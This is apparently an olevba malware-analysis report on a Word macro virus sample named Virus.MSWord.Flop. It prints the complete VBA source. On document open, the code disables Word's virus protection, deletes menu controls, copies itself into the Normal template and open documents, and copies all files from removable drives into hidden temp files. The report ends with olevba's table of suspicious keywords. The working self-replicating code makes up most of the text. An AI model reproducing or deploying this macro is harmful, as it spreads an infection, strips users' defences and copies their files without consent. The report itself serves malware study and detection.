olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Flop-3aa8a18bc1b1f9cab20f41bf28e41f2b990eaddd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Flop-3aa8a18bc1b1f9cab20f41bf28e41f2b990eaddd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'VBACopyFloppy
Option Explicit
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Private Declare Function GetTempFileName Lib "kernel32.dll" Alias "GetTempFileNameA" (ByVal lpszPath As String, ByVal lpPrefixString As String, ByVal wUnique As Long, ByVal lpTempFileName As String) As Long

Private Sub Document_Open()
Dim i As Long, s1 As String * 256, s2 As String
On Error Resume Next
Application.EnableCancelKey = 0
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
CommandBars.FindControl(, 30017).Delete
For i = 1 To CommandBars(29).Controls.Count: CommandBars(29).Controls(1).Delete: Next
For i = 1 To CommandBars(9).Controls.Count: CommandBars(9).Controls(1).Delete: Next
For i = 1 To CommandBars(6).Controls.Count: CommandBars(6).Controls(1).Delete: Next
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 1) Then
    NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
    NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents(1).CodeModule.CountOfLines)
    NormalTemplate.Save
ElseIf ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 1) Then
    With ActiveDocument
        .VBProject.VBComponents(1).CodeModule.DeleteLines 1, .VBProject.VBComponents(1).CodeModule.CountOfLines
        .VBProject.VBComponents(1).CodeModule.AddFromString MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents(1).CodeModule.CountOfLines)
        If Dir(.FullName) <> "" Then .SaveAs .FullName, wdWordDocument
        .Saved = True
    End With
End If
If GetDriveType(Mid(ActiveDocument.FullName, 1, 2)) = 2 Then
    s2 = s1
    GetTempPath 256, s1
    With Application.FileSearch
        .FileName = "*.*"
        .LookIn = Mid(ActiveDocument.FullName, 1, 3)
        .SearchSubFolders = True
        .Execute
        For i = 1 To .FoundFiles.Count: GetTempFileName s1, "~~", 0, s2: CopyFile .FoundFiles(i), s2, 0: SetAttr s2, 7: Next
    End With
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kernel32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

